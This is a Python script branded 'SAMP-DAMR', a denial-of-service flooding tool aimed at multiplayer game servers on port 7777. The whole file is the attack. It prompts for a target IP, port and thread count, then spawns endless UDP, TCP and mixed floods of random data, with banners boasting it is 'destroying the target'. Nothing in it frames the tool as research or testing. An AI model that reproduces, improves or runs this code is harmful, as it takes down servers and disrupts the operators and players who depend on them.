import random
import socket
import threading
import os
import sys
import time

###### SAMP-DAMR ON TOP! #####
os.system("clear")
print("\u001b[35m Welcome to SAMP-DAMR World")
time.sleep(2)
print("Loading powerful attack engine.......")
os.system("clear")

print("""
\u001b[35m
	  SAMP-DAMR ULTIMATE TOOL
	╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
	╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
	╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 2.0
          DAMR - Destroy All Multiplayer Realms
""")

ip = str(input(" Target IP : "))
port = int(input(" Target Port (usually 7777) : "))
choice = str(input(" Use Multi-Vector Attack? (y/n) : ")).lower()
times = int(input(" Packets per thread : "))
threads = int(input(" Number of Threads : "))

def run_udp():
    data = random._urandom(random.randint(512, 2048))  # Random besar payload
    i = random.choice(("[*]","[!]","[#]","[DAMR]","[DESTROY]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            print(i + " UDP Flood Sent!!!")
        except:
            print("[!] UDP Error - Continuing...")

def run_tcp():
    data = random._urandom(random.randint(512, 4096))
    i = random.choice(("[*]","[!]","[#]","[DAMR]","[DESTROY]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + " TCP Flood Sent!!!")
            s.close()
        except:
            print("[*] TCP Error - Retrying...")

def run_mixed():
    data = random._urandom(random.randint(256, 3072))
    i = random.choice(("[*]","[!]","[#]","[DAMR]","[DESTROY]"))
    while True:
        try:
            # Mix UDP + small TCP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            s.sendto(data, addr)
            s.close()
            
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.connect((ip, port))
            s2.send(data)
            s2.close()
            print(i + " Mixed Vector Attack Sent!!!")
        except:
            print("[!] Mixed Error - Continuing...")

print("\u001b[31m[ATTACK STARTING] SAMP-DAMR is now destroying the target...\u001b[0m")
time.sleep(1)

for y in range(threads):
    if choice == 'y':
        # Multi-vector mode (lebih gacor)
        th1 = threading.Thread(target=run_udp)
        th1.start()
        th2 = threading.Thread(target=run_tcp)
        th2.start()
        th3 = threading.Thread(target=run_mixed)
        th3.start()
    else:
        # Basic powerful UDP only
        th = threading.Thread(target=run_udp)
        th.start()

print("\u001b[32mAttack Launched Successfully! All threads active. Press Ctrl+C to stop.\u001b[0m")
